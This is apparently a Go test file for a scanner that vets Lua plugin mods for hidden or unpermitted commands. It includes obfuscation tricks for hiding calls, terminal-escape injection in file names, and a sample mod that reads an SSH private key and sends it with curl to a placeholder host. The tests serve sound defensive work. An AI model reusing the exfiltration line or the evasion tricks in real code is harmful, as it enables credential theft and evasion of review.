package scan

import (
	"strings"
	"testing"

	"gitlab.com/KopyTKG/spot/internal/mod"
)

func scanOf(src string, perms *mod.Permissions) Report {
	return Mod(map[string][]byte{"init.lua": []byte(src)}, perms)
}

func has(notes []Note, text string) bool {
	for _, n := range notes {
		if strings.Contains(n.What, text) {
			return true
		}
	}
	return false
}

// Ways to hide what is called or run. Every one must be refused.
func TestStrictForm(t *testing.T) {
	for name, src := range map[string]string{
		"copying spot":        `local s = spot s.run({"curl"})`,
		"copying a function":  `local r = spot.run r({"curl"})`,
		"a built name":        `spot["ru" .. "n"]({"curl"})`,
		"a variable name":     `local k = "run" spot[k]({"curl"})`,
		"handed to pcall":     `pcall(spot.run, {"curl"})`,
		"handed to a helper":  `local function f(g) g({"curl"}) end f(spot.run)`,
		"in a table":          `local t = {spot.run} t[1]({"curl"})`,
		"returned":            `return spot.run`,
		"as an argument":      `local x = rawget(spot, "run")`,
		"method call":         `spot:run({"curl"})`,
		"method on a library": `spot.json:encode({})`,
		"through _G":          `_G["sp" .. "ot"].run({"curl"})`,
		"_G alone":            `local g = _G`,
		"replacing it":        `spot.run = print`,
		"own spot":            `local spot = {} spot.run({"ls"})`,
		"spot parameter":      `local function f(spot) spot.run({"ls"}) end`,
		"spot function":       `function spot() end`,
		"spot loop name":      `for spot = 1, 2 do end`,
		"spot in for-in":      `for _, spot in pairs({}) do end`,
		"list built before":   `local c = {"curl"} spot.run(c)`,
		"list from a call":    `local function f() return {"curl"} end spot.run(f())`,
		"computed program":    `local p = "curl" spot.run({p})`,
		"joined program":      `spot.run({"cu" .. "rl"})`,
		"unpack first":        `spot.run({unpack({"curl"})})`,
		"duplicate key":       `spot.run({[1] = "ss", [1] = "curl"})`,
		"keyed after":         `local i, x = 1, "curl" spot.run({"ss", [i] = x})`,
		"string call syntax":  `spot.run "curl"`,
		"empty list":          `spot.run({})`,
		"pipe with variable":  `local c = {"curl"} spot.pipe({"ss"}, c)`,
		"pipe computed":       `local p = "sh" spot.pipe({"ss"}, {p})`,
		"hidden in a nest":    `local t = { a = { b = function() while true do if x then return spot end end end } }`,
		"in a method name":    `function spot.x:y() end`,
		"does not parse":      `return (`,
		"bytecode":            "\x1bLua",
	} {
		if r := scanOf(src, nil); len(r.Refused) == 0 {
			t.Errorf("%s: accepted: %s", name, src)
		}
	}
}

func TestOrdinaryCodeIsAccepted(t *testing.T) {
	src := `
local parse = spot.use("ss")
local n = spot.config.limit
local m = spot.config.name:upper()
local function sockets()
  local r = spot.run({ "ss", "-H", "-tuna" }, { timeout = 2000 })
  if r.status ~= 0 then error(r.stderr) end
  return parse(r.stdout)
end
spot.value("table", { ttl = 2000 }, sockets)
spot.on("x", function(args)
  local p = spot.pipe({ "ss", "-H", args[1] }, { "grep", "LISTEN" }, { timeout = 100 })
  return spot.json.decode(p.stdout).a, spot.env("HOME"):len(), { spot = 1 }
end)
`
	perms := &mod.Permissions{Run: map[string]string{"ss": "r", "grep": "r"}, Env: map[string]string{"HOME": "r"}, Netlink: map[string]string{"diag": "r"}}
	r := scanOf(src, perms)
	if len(r.Refused) > 0 {
		t.Errorf("refused: %+v", r.Refused)
	}
	// Only that an argument is chosen while it runs.
	if len(r.Flagged) != 1 || !has(r.Flagged, `computed arguments to "ss"`) {
		t.Errorf("flagged: %+v", r.Flagged)
	}
}

func TestWhatIsPointedAt(t *testing.T) {
	// The mod of the first prototype: reads a key and sends it away, while
	// saying it lists key bindings.
	src := `
local k = spot.read("~/.ssh/id_ed25519")
spot.run({ "curl", "-d", k, "https://example.invalid/collect" })
spot.run({ "hyprctl", "binds" })
local blob = "` + strings.Repeat("QUJD", 30) + `"
local x = string.char(99, 117) .. ("abc"):len()
local y = string.reverse("lruc")
local home = spot.env("HOME") .. "/.config/fish/config.fish"
spot.run({ "/home/me/bin/tool", unpack(args) }, { env = { LD_PRELOAD = "x" } })
spot.write("/tmp/o", "\104\116\116\112\115\58\47\47")
local ip = "203.0.113.7"
`
	r := scanOf(src, &mod.Permissions{Run: map[string]string{"hyprctl": "read the bindings", "ssh": "?"}, Net: map[string]string{"443": "?"}, Socket: map[string]string{"$XDG_RUNTIME_DIR/bus": "?"}})
	if len(r.Refused) > 0 {
		t.Fatalf("refused: %+v", r.Refused)
	}
	for _, want := range []string{
		`reads "~/.ssh/id_ed25519" without permission`, `names "~/.ssh/id_ed25519"`, `runs "curl"`, `runs "curl" without permission`,
		`contains the address "https://example.invalid/collect"`, `runs "hyprctl"`, `computed arguments to "curl"`,
		"long encoded string", "string.char", "string.reverse", "assembles a path", `reads the variable "HOME" without permission`,
		`runs the file "/home/me/bin/tool"`, `unpacks a list into the arguments`, `sets the variable "LD_PRELOAD" without permission`,
		`writes "/tmp/o" without permission`, "written as escape codes", `IP address "203.0.113.7"`,
		`may run "ssh"`, `unused permission run "ssh"`, `may use the network`, `may talk to the socket`,
	} {
		if !has(r.Flagged, want) {
			t.Errorf("not flagged: %s", want)
		}
	}
	if t.Failed() {
		for _, n := range r.Flagged {
			t.Logf("%s %s", n.Where(), n.What)
		}
	}
}

func TestUnusedPermissions(t *testing.T) {
	r := scanOf(`return 1`, &mod.Permissions{
		Run: map[string]string{"ls": "r"}, Read: map[string]string{"/etc/hostname": "r"}, Write: map[string]string{"/tmp/x": "r"},
		Env: map[string]string{"LANG": "r"}, Setenv: map[string]string{"TZ": "r"}, Netlink: map[string]string{"diag": "r"},
	})
	for _, kind := range []string{"run", "read", "write", "env", "setenv", "netlink"} {
		if !has(r.Flagged, "unused permission "+kind) {
			t.Errorf("%s: %+v", kind, r.Flagged)
		}
	}
}

func TestEachReportedOnceAndSafeToShow(t *testing.T) {
	r := Mod(map[string][]byte{
		"a.lua":             []byte(`spot.run({"curl"}) spot.run({"curl"})` + "\n" + `local x = "https://e.invalid/\27[2J` + "‮" + `"`),
		"b\x1b[31m\nok.lua": []byte(`spot.run({"curl"})`),
	}, nil)
	count := 0
	for _, n := range r.Flagged {
		if n.What == `runs "curl"` {
			count++
		}
		if strings.ContainsAny(n.What+n.Where(), "\x1b\n‮") {
			t.Errorf("a mod's text can disturb the output: %q %q", n.Where(), n.What)
		}
	}
	if count != 1 {
		t.Errorf("reported %d times", count)
	}
}

// Code made to be deep must not bring the scanner down.
func TestDeepCode(t *testing.T) {
	scanOf("local a = 'x'\nlocal b = a"+strings.Repeat("..a", 100_000), nil)
	scanOf("local t = "+strings.Repeat("{", 5000)+strings.Repeat("}", 5000), nil)
}

func TestPlacesThatRunLaterMatterWhenWritten(t *testing.T) {
	read := scanOf(`spot.run({"cat"})`, &mod.Permissions{Run: map[string]string{"cat": "r"}, Read: map[string]string{"~/.config/hypr": "r", "~/.gnupg": "r"}})
	if has(read.Flagged, ".config/hypr") || !has(read.Flagged, ".gnupg") {
		t.Errorf("reading: %+v", read.Flagged)
	}
	write := scanOf(`spot.run({"cat"})`, &mod.Permissions{Run: map[string]string{"cat": "r"}, Write: map[string]string{"~/.config/hypr": "r"}})
	if !has(write.Flagged, `names "~/.config/hypr"`) {
		t.Errorf("writing: %+v", write.Flagged)
	}
}

// Ordinary parsing code must stay quiet, or the findings stop being read.
func TestOrdinaryParsingIsQuiet(t *testing.T) {
	src := `
local sep = "\n"
local names = { ["wl-0"] = "wifi", [1] = "x" }
local P = {} P.__index = P
return function(input, options)
  local rows, seen = {}, {}
  for line in input:gmatch("[^\n]+") do
    local name, state, pct = line:match("^(%S+)%s+(%a+)%s+(%d+)%%")
    if name and not seen[name:lower()] then
      seen[name:lower()] = true
      local label = name .. ": " .. state:upper() .. " (" .. pct .. "%)"
      rows[#rows + 1] = { label = label, key = name, comment = table.concat({ state, pct }, " "), on = state == "on" }
    end
    local long = "a sentence that is wrapped " .. "over two lines of the source"
  end
  if line == "::" or line == "0.0.0.0:*" or line == "[::]:*" or line == "127.0.0.1" or line == "12:34:56" then end
  table.sort(rows, function(a, b) return a.key < b.key end)
  return rows
end`
	if r := scanOf(src, nil); len(r.Flagged)+len(r.Refused) > 0 {
		for _, n := range append(r.Refused, r.Flagged...) {
			t.Errorf("%s %s", n.Where(), n.What)
		}
	}
}
